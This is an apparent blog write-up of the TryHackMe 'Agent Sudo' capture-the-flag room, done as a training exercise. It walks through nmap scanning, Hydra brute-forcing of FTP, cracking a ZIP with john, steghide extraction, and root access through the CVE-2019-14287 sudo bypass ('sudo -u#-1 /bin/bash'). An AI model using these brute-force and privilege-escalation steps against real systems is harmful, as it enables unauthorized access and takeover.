---
title: "Agent Sudo"
date: 2020-05-09T10:17:19+02:00
categories:
- Writeups
tags:
- tryhackme
- sudo
- cracking
---

![Agent sudo](/images/agent-sudo/agent-sudo.png)

This room can be found at [Tryhackme](https://tryhackme.com/room/agentsudoctf). It is a pretty simple and fun room that requires the knowlege of a few password cracking tools and privelege escalation.

## Enumerate

Run `nmap` with `nmap -sV -sC -vv $IP | tee nmap.txt` and we see that we have three ports open: 21, 22 and 80.

```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5hdrxDB30IcSGobuBxhwKJ8g+DJcUO5xzoaZP/vJBtWoSf4nWDqaqlJdEF0Vu7Sw7i0R3aHRKGc5mKmjRuhSEtuKKjKdZqzL3xNTI2cItmyKsMgZz+lbMnc3DouIHqlh748nQknD/28+RXREsNtQZtd0VmBZcY1TD0U4XJXPiwleilnsbwWA7pg26cAv9B7CcaqvMgldjSTdkT1QNgrx51g4IFxtMIFGeJDh2oJkfPcX6KDcYo6c9W1l+SCSivAQsJ1dXgA2bLFkG/wPaJaBgCzb8IOZOfxQjnIqBdUNFQPlwshX/nq26BMhNGKMENXJUpvUTshoJ/rFGgZ9Nj31r
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdSVnnzMMv6VBLmga/Wpb94C9M2nOXyu36FCwzHtLB4S4lGXa2LzB5jqnAQa0ihI6IDtQUimgvooZCLNl6ob68=
|   256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOL3wRjJ5kmGs/hI4aXEwEndh81Pm/fvo8EvcpDHR5nt
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Change the user agent to `C` and get redirected to a page `$IP/agent_C_attention.php`. We get the information that the user is called `chris`. 

```
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R
```

## Hash Cracking and Brute-Force

We now have a user and know that the password should be weak. Let's start with FTP.

### FTP

`ftp` can be cracked with `Hydra`

```bash
hydra -l chris -P /usr/share/wordlists/users/100_common_passwords.txt -vV $IP ftp
```

Password not found. Let's test a bigger list:

```bash
hydra -l chris -P /usr/share/wordlists/users/1000_common_passwords.txt -vV $IP ftp
```

Password found!

Use `ftp $IP` to connect to the `ftp` server and download the files using `get <file>`.

### ZIP

Running `strings cutie.png` reveals that there is something in the file.

We run `binwalk -e cutie.png` to extract all embedded files. We find a password protected ZIP file called `8702.zip`. We can use `john` to crack the password. 

```bash
zip2john 8702.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Password found!

The file `To_agentR.txt` now has content:

```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

### Steganography

Decode the string with base64: `echo QXJlYTUx | base64 -d`.

Use `steghide` to find hidden message in `cute_alien.jpg`.

`steghide extract -sf cute_alien.jpg`

```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

We now have a password for the user `james` and can login with `ssh`.

```bash
ssh james@$IP
```

## Privlege Escalation

We upload `LinEnum.sh` to the remote server.

```
[-] Sudo version:
Sudo version 1.8.21p2
```

We find that there is a vulnerability for the `sudo` version `CVE-2019-14287`.

`sudo -l` reveals that `james` can run the command `/bin/bash` as any user but `root` which seems fine.

```
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

However, the vulnerability is that if we specify a user ID such as *-1*, it will run as the id *0* which is the root user.

```bash
sudo -u#-1 /bin/bash
```

This gives us `root` and we can find the root flag!
